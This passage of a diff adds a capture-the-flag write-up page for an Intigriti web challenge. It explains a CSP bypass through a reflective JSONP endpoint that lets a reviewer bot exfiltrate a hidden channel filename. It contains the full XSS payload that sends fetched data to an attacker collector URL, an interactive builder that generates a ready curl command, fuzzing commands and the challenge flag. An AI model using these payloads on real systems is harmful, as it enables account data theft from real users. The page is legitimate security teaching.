+        one leading digit to satisfy the validator, then plain markup. Server answers
+        <code>{"id":"9964f1bb4ef2480a","status":"queued"}</code>.</figcaption>
+    </figure>
+
+    <p>It landed within seconds:</p>
+
+    <figure class="shot">
+      <img src="images/8.png"
+           alt="Webhook.site request details showing a GET from 3.251.43.33 in Dublin with HeadlessChrome user agent and Referer http://web/">
+      <figcaption><b>The reviewer's browser.</b> <code>HeadlessChrome/129</code> from <code>3.251.43.33</code>
+        (AWS <code>eu-west-1</code>, Dublin), <code>sec-fetch-dest: image</code>,
+        <code>sec-fetch-site: cross-site</code>, and crucially <code>referer: http://web/</code>, an internal
+        origin. Our HTML is rendering on a page we cannot browse to ourselves.</figcaption>
+    </figure>
+
+    <p>With a live DOM confirmed, the next question is what survives in it. I fired one report per vector,
+      each pointing at a distinct path so the listener log itself is the result table:</p>
+
+    <div class="tw">
+      <table>
+        <thead><tr><th>Vector</th><th>Fires</th><th>Sec-Fetch-Dest</th></tr></thead>
+        <tbody>
+          <tr><td><code>&lt;img src&gt;</code></td><td><span class="tag md">yes</span></td><td><code>image</code></td></tr>
+          <tr><td><code>&lt;iframe src&gt;</code></td><td><span class="tag md">yes</span></td><td><code>iframe</code></td></tr>
+          <tr><td><code>&lt;link rel=stylesheet&gt;</code></td><td><span class="tag md">yes</span></td><td><code>style</code></td></tr>
+          <tr><td><code>&lt;style&gt;@import&lt;/style&gt;</code></td><td><span class="tag md">yes</span></td><td><code>style</code></td></tr>
+          <tr><td><code>&lt;base href&gt;</code></td><td><span class="tag md">yes</span></td><td>·</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>Everything that survives is markup that <em>loads</em> something. Nothing that <em>runs</em> anything
+      does: <code>&lt;img onerror&gt;</code>, <code>&lt;svg onload&gt;</code> and a cross-origin
+      <code>&lt;script src&gt;</code> were all sent the same way, each pointing at its own path, and none of
+      them ever reached the listener.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 06 · The wrong turn</div>
+    <h2>Diagnosing a sanitiser that was never there</h2>
+    <p>The obvious reading of that table is an HTML sanitiser with a tag allowlist that strips
+      <code>on*</code> handlers. I committed to it and spent a long time there:</p>
+
+    <ul>
+      <li><strong>Twelve mutation-XSS vectors.</strong> <code>&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;</code>,
+        <code>&lt;svg&gt;&lt;style&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;xmp&gt;</code>,
+        <code>&lt;template&gt;</code>, <code>&lt;iframe srcdoc&gt;</code>, <code>javascript:</code> in
+        <code>&lt;object data&gt;</code>. All silent.</li>
+      <li><strong>CSS exfiltration.</strong> Since stylesheets execute, I used <code>@font-face</code> with
+        <code>unicode-range</code> to leak which characters render, and attribute selectors to test attribute
+        contents. This <em>worked</em>: I pulled per-element character sets out of the reviewer's DOM with no
+        JavaScript. It just proved the flag was not on that page.</li>
+      <li><strong><code>&lt;base href&gt;</code> hijacking.</strong> Accepted, and it does retarget relative URLs,
+        but only ones in the injected markup; the page's own resources resolve before our injection point.</li>
+    </ul>
+
+    <div class="note">
+      <span class="lab">The mistake</span>
+      <p>I diagnosed from a symptom, <em>handlers don't fire</em>, instead of testing the mechanism.
+        A sanitiser <b>removes the tag</b>. A Content-Security-Policy <b>leaves the tag and refuses to run it</b>.
+        My remote <code>&lt;script src&gt;</code> failed because it was <em>cross-origin</em>, not because it was
+        a script, and I never ran the one experiment that separates those two worlds: a
+        <strong>same-origin</strong> <code>src</code>.</p>
+    </div>
+
+    <p>Worth stating plainly: I never read the policy. None of the public endpoints send a
+      <code>Content-Security-Policy</code> header at all, and the reviewer's page lives at
+      <code>http://web/</code>, which is not reachable from outside. The policy is inferred from behaviour.</p>
+
+    <p>But the behaviour pins it down. A sanitiser with a tag allowlist would have <em>removed</em> the
+      <code>&lt;script&gt;</code> element; instead the tag survives and simply refuses to run when its
+      <code>src</code> is cross-origin. Point that same tag at the challenge's own origin, as the next step
+      does, and it executes. Handlers dead, remote scripts dead, same-origin scripts alive is the exact
+      signature of <code>script-src 'self'</code> with no <code>'unsafe-inline'</code>.</p>
+
+    <p>Either way the practical conclusion is the same, and it reframes the problem completely. The question
+      is no longer "find a tag the sanitiser missed". It is <strong>"find any URL on this origin that will
+      return JavaScript I control"</strong>, because whatever is enforcing this will trust it unconditionally.</p>
+
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 07 · The gadget</div>
+    <h2>An endpoint that hands you executable JavaScript</h2>
+    <p>So I went back to <code>/api/</code>, but looking for something specific. The stock API wordlist finds
+      nothing:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>stock wordlist</span><span>shell</span></div>
+<pre>ffuf -u https://challenge-0826.challenges.intigriti.io/FUZZ \
+     -w SecLists/Discovery/Web-Content/api/api-endpoints.txt \
+     -mc 200,405
+
+<span class="c">:: Progress: [295/295] :: Errors: 0 ::</span>
+<span class="bad">(no results)</span></pre>
+      </div>
+      <figcaption>295 entries, zero hits. Worth checking why rather than moving on: the list contains
+        <code>api/jsonpcallback</code> but never plain <code>api/jsonp</code>.</figcaption>
+    </figure>
+
+    <div class="note good">
+      <span class="lab">Change the question</span>
+      <p>Knowing the policy is <code>script-src 'self'</code> changes what you are hunting for. You are no
+        longer looking for <em>any</em> endpoint. You are looking for endpoints that return
+        <b>JavaScript</b>, which is a much shorter list of words, and one you write yourself.</p>
+    </div>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>custom wordlist</span><span>shell</span></div>
+<pre><span class="c">$ cat jsonp-wl.txt</span>
+jsonp          callback       json
+jsonp_callback jsonapi        data
+jsonpcallback  config         channels
+
+<span class="c">$</span> ffuf -u https://challenge-0826.challenges.intigriti.io/api/FUZZ \
+     -w jsonp-wl.txt -mc 200,405
+
+<span class="bad">jsonp</span>   [Status: 200]</pre>
+      </div>
+      <figcaption>Fourteen hand-picked words find what 295 generic ones missed. The endpoint appears nowhere
+        in the client bundle, so reading the application would never have surfaced it either.</figcaption>
+    </figure>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>GET /api/jsonp?callback=alert(1)</span><span>response</span></div>
+<pre>HTTP/2 200
+Content-Type: <span class="k">application/javascript</span>; charset=utf-8
+
+/**/ <span class="bad">alert(1)</span>({"channels": 10});</pre>
+      </div>
+      <figcaption>The <code>callback</code> parameter is reflected verbatim into an executable response.
+        Textbook unfiltered JSONP.</figcaption>
+    </figure>
+
+    <h4>What JSONP is, and why it is dangerous here</h4>
+    <p>JSONP predates CORS. It solved a problem the Same-Origin Policy created: a page could not read JSON
+      from another origin, but it <em>could</em> always load a script from one, because
+      <code>&lt;script src&gt;</code> was never subject to the SOP. So servers wrapped their JSON in a function
+      call and let the caller name the function:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>how JSONP was meant to work</span><span>js</span></div>
+<pre><span class="c">// the page declares a handler and loads the endpoint as a script</span>
+<span class="k">function</span> gotChannels(data) { console.log(data.channels); }
+
+&lt;script src="/api/jsonp?<span class="k">callback=gotChannels</span>"&gt;&lt;/script&gt;
+
+<span class="c">// the server replies with executable JavaScript, not JSON</span>
+gotChannels({"channels": 10});   <span class="c">// browser runs it, handler receives the data</span></pre>
+      </div>
+      <figcaption>The response is a script, so the data arrives by <em>calling a function</em> rather than by
+        being read.</figcaption>
+    </figure>
+
+    <p>The whole design rests on <code>callback</code> being a function <em>name</em>. This server never checks
+      that. Anything you put in the parameter is pasted straight into a response served as
+      <code>application/javascript</code>, so the endpoint will hand you any JavaScript you ask it for, from
+      the challenge's own origin.</p>
+
+    <div class="note">
+      <span class="lab">Why this beats the CSP</span>
+      <p><code>script-src 'self'</code> means "only run scripts from my own origin". It is an assertion about
+        <em>where</em> a script came from, never about <em>what is in it</em>. A reflective JSONP route turns the
+        origin itself into a source of attacker-controlled JavaScript, so the policy's own definition of trust
+        becomes the way through it. Any endpoint that echoes input into a JS response is a
+        <b>script gadget</b>, and one is enough.</p>
+    </div>
+
+    <figure class="shot">
+      <img src="images/7.png"
+           alt="Browser showing challenge-0826.challenges.intigriti.io/api/jsonp returning the JavaScript body slash-star-star-slash open-paren channels colon 10 close-paren semicolon">
+      <figcaption><b>The endpoint, in a browser.</b> With no <code>callback</code> supplied it still answers
+        <code>/**/ ({"channels": 10});</code>, served as JavaScript. Two gifts in one response: a script
+        gadget on the origin, and confirmation that the station knows about exactly ten public channels.</figcaption>
+    </figure>
+
+    <p>This is the whole challenge in one response. <code>/api/jsonp</code> is same-origin, so:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>why the CSP does not stop it</span><span>logic</span></div>
+<pre>policy          script-src 'self'
+we inject       &lt;script src="/api/jsonp?callback=OURCODE"&gt;
+browser asks    is /api/jsonp same-origin?   <span class="k">yes</span>
+                is it allowed by 'self'?     <span class="k">yes</span>
+result          OURCODE executes as <span class="bad">first-party code</span></pre>
+      </div>
+    </figure>
+
+    <p>The response body also leaks the station's own inventory: <code>{"channels": 10}</code>. Ten public
+      channels, and a loader that answered <code>403</code> rather than <code>404</code> above them.
+      Those two facts together say: <em>channel 11 exists, and someone is allowed to see it.</em></p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 08 · The payload</div>
+    <h2>Assembling it, and the encoding that bites</h2>
+    <p>The payload is one report. The leading digit satisfies the validator; the remainder is a same-origin
+      script tag whose callback is our code:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>payload · decoded for reading</span><span>channelId</span></div>
+<pre>1&lt;script src="/api/jsonp?callback=
+    fetch('/api/channels/11/load')
+      .then(r =&gt; r.text())
+      .then(x =&gt; new Image().src =
+        'https://YOUR-OOB/R?d=' + encodeURIComponent(x))
+"&gt;&lt;/script&gt;</pre>
+      </div>
+    </figure>
+
+    <div class="note">
+      <span class="lab">Encoding, two layers</span>
+      <p>This is where most attempts break. The JavaScript is <b>URL-encoded once</b> so it survives as a query
+        parameter inside <code>src="…"</code>, and then the whole payload is <b>form-encoded again</b> for the
+        request body. Encode once and the callback truncates at the first <code>&amp;</code> or <code>=</code>;
+        forget the outer layer and the body parser mangles it.</p>
+    </div>
+
+    <p>Sent through Repeater as a normal form post:</p>
+
+    <figure class="shot">
+      <img src="images/1.png"
+           alt="Burp Repeater showing the POST /api/report request with the double-encoded JSONP script payload and a 200 queued response">
+      <figcaption><b>The winning request.</b> Doubly-encoded <code>channelId</code>, <code>200 OK</code>,
+        <code>{"id":"0afcfed9ccd3f877","status":"queued"}</code>. Note the body is otherwise an ordinary
+        form post, with no exotic headers and no auth.</figcaption>
+    </figure>
+
+    <p>Why <code>new Image().src</code> rather than <code>fetch()</code> for the exfiltration? An image load is
+      a plain subresource request: no CORS preflight, no response reading, and it works under an
+      <code>img-src</code> that permits external hosts. We do not need to read our own beacon; we only need the
+      data to appear in its URL.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 09 · Exfiltration</div>
+    <h2>Channel eleven answers</h2>
+
+    <figure class="shot">
+      <img src="images/3.png"
+           alt="Webhook.site showing the exfiltrated query string containing the JSONP response and channel 11 stream filename">
+      <figcaption><b>The reviewer reports back.</b> The <code>d</code> parameter
+        carries the JSONP body (<code>{"channels": 10}</code>) and then the prize:
+        <code>11:3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4</code>, the name of a
+        stream the server refuses to give us directly.</figcaption>
+    </figure>
+
+    <p>Channel 11 is real. It is a stream with a 64-hex-character name, unguessable by brute force, which is
+      why the authorisation bug matters: the name is the secret, and only a privileged session can ask for it.</p>
+
+    <p>Now the two halves of the challenge meet. The loader only ever returns a <em>bare filename</em>, because
+      <code>VALID</code> forbids slashes. The <em>directory</em> was disclosed in the page markup back at Step 01.
+      Join them:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>assembling the URL</span><span>final</span></div>
+<pre>directory  <span class="s">/static/streams/</span>              <span class="c">← from &lt;source&gt; in the page</span>
+filename   <span class="s">3b7c7029…aef7437.mp4</span>       <span class="c">← from channel 11 via the bot</span>
+
+GET /static/streams/3b7c7029a954248116ad18348b2a51dad448400fe0b36a0098fa55dc0aef7437.mp4
+<span class="k">200 OK</span> · video/mp4</pre>
+      </div>
+      <figcaption>The stream itself has no authorisation. Only the loader that names it does.</figcaption>
+    </figure>
+  </section>
+
+  <!-- ============================================ -->
+  <div class="reveal">
+    <figure class="shot">
+      <img src="images/5.png"
+           alt="The channel 11 video playing in a browser, showing CH 11 and the flag on a CRT-style screen">
+      <figcaption><b>Channel 11, playing.</b> The tape the old man did not want you to tune to.</figcaption>
+    </figure>
+
+    <div class="crt">
+      <div class="osd">CH 11</div>
+      <div class="flag">INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}<span class="caret" aria-hidden="true"></span></div>
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Try it yourself</div>
+    <h2>The keypad only goes to ten</h2>
+    <p>Here is the set, rebuilt. Press any button and you get what every solver got for the first hour.
+      The dial has no eleven on it, but the tuner underneath will take any number you type.</p>
+
+    <div class="tuner">
+      <div class="tuner-screen">
+        <canvas id="tvsnow" width="320" height="200" aria-hidden="true"></canvas>
+        <div class="tv-osd" id="tvOsd">CH --</div>
+        <div class="tv-msg" id="tvMsg">Press a channel</div>
+      </div>
+      <div class="tuner-pad">
+        <div class="pad-label">Channel</div>
+        <div class="keys" id="keys"></div>
+        <form class="manual" id="manual" autocomplete="off">
+          <label for="chIn">Tune</label>
+          <input id="chIn" type="text" inputmode="numeric" maxlength="3" placeholder="e.g. 12" aria-label="Channel number">
+          <button type="submit">Go</button>
+        </form>
+      </div>
+    </div>
+    <p class="tuner-hint" id="tunerHint">Ten buttons, and one answer that isn't on any of them.
+      The station said there were ten channels. It did not say ten was the last one.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Run it</div>
+    <h2>Build the payload against your own listener</h2>
+    <p>The tuner above is a replica. This one is real. Put in a collector URL and it assembles the exact
+      request, double-encoding and all. Paste it into a terminal, watch your inbox, and the bot hands you
+      the filename of a channel you are not allowed to read.</p>
+
+    <div class="lab-panel">
+      <div class="lab-step">
+        <span class="lab-n">1</span>
+        <div class="lab-body">
+          <label for="oob">Your collector URL</label>
+          <input id="oob" type="text" spellcheck="false"
+                 placeholder="https://webhook.site/your-uuid-here">
+          <p class="lab-note">Open <a href="https://webhook.site" target="_blank" rel="noopener noreferrer">webhook.site</a>
+            and paste the URL it gives you.</p>
+        </div>
+      </div>
+
+      <div class="lab-step">
+        <span class="lab-n">2</span>
+        <div class="lab-body">
+          <label>Paste into a terminal <button type="button" class="copybtn" id="copyCurl">Copy</button></label>
+          <textarea id="outCurl" rows="5" readonly spellcheck="false"></textarea>
+          <p class="lab-note">Run it and the server answers
+            <code>{"id":"…","status":"queued"}</code>. Then watch your webhook.site inbox: a
+            <code>GET /F?c=…</code> arrives within seconds, and the <code>c</code> parameter holds the
+            filename of channel 11.</p>
+
+          <label style="margin-top:.9rem">Or just the body, for Burp Repeater
+            <button type="button" class="copybtn" id="copyBody">Copy</button></label>
+          <textarea id="outBody" rows="3" readonly spellcheck="false"></textarea>
+          <p class="lab-note">Drop this in as the request body of a
+            <code>POST /api/report</code> with
+            <code>Content-Type: application/x-www-form-urlencoded</code>. Let Burp recalculate
+            <code>Content-Length</code>.</p>
+        </div>
+      </div>
+
+      <div class="lab-step">
+        <span class="lab-n">3</span>
+        <div class="lab-body">
+          <label for="fname">The filename your listener received</label>
+          <input id="fname" type="text" spellcheck="false" placeholder="11:3b7c7029….mp4">
+          <p class="lab-note" id="finalOut">The stream itself needs no authorisation. Only the loader that
+            names it does.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <div class="signoff">
+    <div class="bars" aria-hidden="true">
+      <i style="background:#B8B8B8"></i><i style="background:#B8B821"></i>
+      <i style="background:#21B8B8"></i><i style="background:#21B821"></i>
+      <i style="background:#B821B8"></i><i style="background:#B82121"></i>
+      <i style="background:#2121B8"></i>
+    </div>
+    <div class="eot">End of transmission</div>
+    <p class="who"><a href="https://github.com/romilp619">Romil Patel</a></p>
+  </div>
+
+</div>
+
+<script>
+  (function () {
+    var root = document.documentElement;
+    try {
+      var saved = localStorage.getItem('theme');
+      if (saved === 'dark' || saved === 'light') root.setAttribute('data-theme', saved);
+    } catch (e) {}
+    var btn = document.createElement('button');
+    btn.className = 'themebtn';
+    btn.type = 'button';
+    btn.setAttribute('aria-label', 'Toggle colour theme');
+    btn.textContent = 'Theme';
+    btn.addEventListener('click', function () {
+      var isDark = root.getAttribute('data-theme') === 'dark' ||
+        (!root.getAttribute('data-theme') &&
+         window.matchMedia('(prefers-color-scheme: dark)').matches);
+      var next = isDark ? 'light' : 'dark';
+      root.setAttribute('data-theme', next);
+      try { localStorage.setItem('theme', next); } catch (e) {}
+    });
+    document.body.appendChild(btn);
+  })();
+
+  /* live TV snow in the masthead */
+  (function () {
+    var c = document.getElementById('snow');
+    if (!c) return;
+    var reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+    var x = c.getContext('2d'), w = c.width, h = c.height;
+
+    function draw() {
+      var img = x.createImageData(w, h), d = img.data;
+      for (var i = 0; i < d.length; i += 4) {
+        var v = (Math.random() * 255) | 0;
+        d[i] = d[i + 1] = d[i + 2] = v;
+        d[i + 3] = 46;                      // faint, so the page stays readable
+      }
+      x.putImageData(img, 0, 0);
+    }
+    draw();
+    if (reduce) return;
+    var last = 0;
+    (function loop(t) {
+      if (t - last > 70) { draw(); last = t; }
+      requestAnimationFrame(loop);
+    })(0);
+  })();
+
+  /* interactive tuner: the keypad stops at ten, the tuner does not */
+  (function () {
+    var cv = document.getElementById('tvsnow');
+    if (!cv) return;
+    var reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+    var x = cv.getContext('2d'), w = cv.width, h = cv.height;
+    var osd = document.getElementById('tvOsd');
+    var msg = document.getElementById('tvMsg');
+    var hint = document.getElementById('tunerHint');
+    var keys = document.getElementById('keys');
+    var FLAG = 'INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}';
+    var noisy = true;
+
+    function snow() {
+      var img = x.createImageData(w, h), d = img.data;
+      for (var i = 0; i < d.length; i += 4) {
+        var v = (Math.random() * 255) | 0;
+        d[i] = d[i + 1] = d[i + 2] = v; d[i + 3] = 255;
+      }
+      x.putImageData(img, 0, 0);
+    }
+    snow();
+    if (!reduce) {
+      var last = 0;
+      (function loop(t) {
+        if (noisy && t - last > 66) { snow(); last = t; }
+        requestAnimationFrame(loop);
+      })(0);
+    }
+
+    function tune(n) {
+      var v = String(n).replace(/\D/g, '');
+      if (!v) return;
+      osd.textContent = 'CH ' + (v.length < 2 ? '0' + v : v);
+      var num = parseInt(v, 10);
+      if (num === 11) {
+        noisy = true;
+        msg.textContent = FLAG;
+        msg.classList.add('win');
+        cv.style.opacity = '.12';
+        hint.textContent = 'That is the whole challenge: the channel the keypad refuses to offer.';
+      } else if (num >= 1 && num <= 10) {
+        noisy = true; cv.style.opacity = '.5';
+        msg.classList.remove('win');
+        msg.textContent = 'static.mp4 → /static.mp4 → 404';
+      } else {
+        noisy = true; cv.style.opacity = '.5';
+        msg.classList.remove('win');
+        msg.textContent = 'channel not available (403)';
+      }
+    }
+
+    for (var i = 1; i <= 10; i++) {
+      (function (n) {
+        var b = document.createElement('button');
+        b.type = 'button'; b.textContent = n;
+        b.setAttribute('aria-label', 'Channel ' + n);
+        b.addEventListener('click', function () { tune(n); });
+        keys.appendChild(b);
+      })(i);
+    }
+
+    document.getElementById('manual').addEventListener('submit', function (e) {
+      e.preventDefault();
+      tune(document.getElementById('chIn').value);
+    });
+  })();
+
+  /* live payload builder */
+  (function () {
+    var oob = document.getElementById('oob');
+    if (!oob) return;
+    var outBody = document.getElementById('outBody');
+    var outCurl = document.getElementById('outCurl');
+    var fname   = document.getElementById('fname');
+    var finalOut = document.getElementById('finalOut');
+    var TARGET = 'https://challenge-0826.challenges.intigriti.io';
+
+    /* match Python's quote(safe='') so the payload is byte-identical to the one that worked */
+    function enc(s) {
+      return encodeURIComponent(s).replace(/[!'()*]/g, function (c) {
+        return '%' + c.charCodeAt(0).toString(16).toUpperCase();
+      });
+    }
+
+    function build() {
+      var w = (oob.value || 'https://YOUR-COLLECTOR').trim().replace(/\/+$/, '');
+      var js = "fetch('/api/channels/11/load').then(r=>r.text()).then(x=>new Image().src='"
+             + w + "/F?c='+encodeURIComponent(x))";
+      var payload = '1<script src="/api/jsonp?callback=' + enc(js) + '"><\/script>';
+      var body = 'channelId=' + enc(payload);
+      outBody.value = body;
+      outCurl.value = "curl -s -X POST '" + TARGET + "/api/report' \\\n"
+        + "  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
+        + "  --data '" + body + "'";
+    }
+
+    function copy(btn, src) {
+      btn.addEventListener('click', function () {
+        src.select();
+        var ok = false;
+        try { ok = document.execCommand('copy'); } catch (e) {}
+        if (navigator.clipboard) { navigator.clipboard.writeText(src.value).catch(function(){}); ok = true; }
+        btn.textContent = ok ? 'Copied' : 'Select + ⌘C';
+        btn.classList.add('done');
+        setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('done'); }, 1600);
+      });
+    }
+    copy(document.getElementById('copyBody'), outBody);
+    copy(document.getElementById('copyCurl'), outCurl);
+
+    fname.addEventListener('input', function () {
+      var v = fname.value.trim().replace(/^\s*\d+\s*:\s*/, '');   // strip a leading "11:"
+      if (!/\.mp4$/i.test(v)) {
+        finalOut.innerHTML = 'The stream itself needs no authorisation. Only the loader that names it does.';
+        return;
+      }
+      var url = TARGET + '/static/streams/' + v;
+      finalOut.innerHTML = 'Directory from the page markup, filename from the bot: '
+        + '<a class="final-link" href="' + url.replace(/"/g, '&quot;') + '" target="_blank" rel="noopener noreferrer">'
+        + '/static/streams/' + v.replace(/</g, '&lt;') + '</a>. Open it and the flag is on screen.';
+    });
+
+    oob.addEventListener('input', build);
+    build();
+  })();
+
+  /* scroll position as an on-screen channel display */
+  (function () {
+    var steps = Array.prototype.slice.call(document.querySelectorAll('section .ch'));
+    if (!steps.length) return;
+    var osd = document.createElement('div');
+    osd.className = 'scroll-osd';
+    document.body.appendChild(osd);
+    var hideT;
+    function update() {
+      var best = null, bestTop = -Infinity;
+      steps.forEach(function (s) {
+        var t = s.getBoundingClientRect().top;
+        if (t < 140 && t > bestTop) { bestTop = t; best = s; }
+      });
+      if (!best) { osd.classList.remove('on'); return; }
+      osd.textContent = best.textContent.trim().toUpperCase();
+      osd.classList.add('on');
+      clearTimeout(hideT);
+      hideT = setTimeout(function () { osd.classList.remove('on'); }, 1400);
+    }
+    window.addEventListener('scroll', update, { passive: true });
+    update();
+  })();
+
+  /* power the CRT on when the flag scrolls into view */
+  (function () {
+    var crt = document.querySelector('.crt');
+    if (!crt || !('IntersectionObserver' in window)) return;
+    crt.classList.add('warming');
+    new IntersectionObserver(function (entries, obs) {
+      entries.forEach(function (e) {
+        if (e.isIntersecting) {
+          crt.classList.remove('warming');
+          crt.classList.add('lit');
+          obs.unobserve(e.target);
+        }
+      });
+    }, { threshold: 0.35 }).observe(crt);
+  })();
+</script>
+
+</body>
+</html>
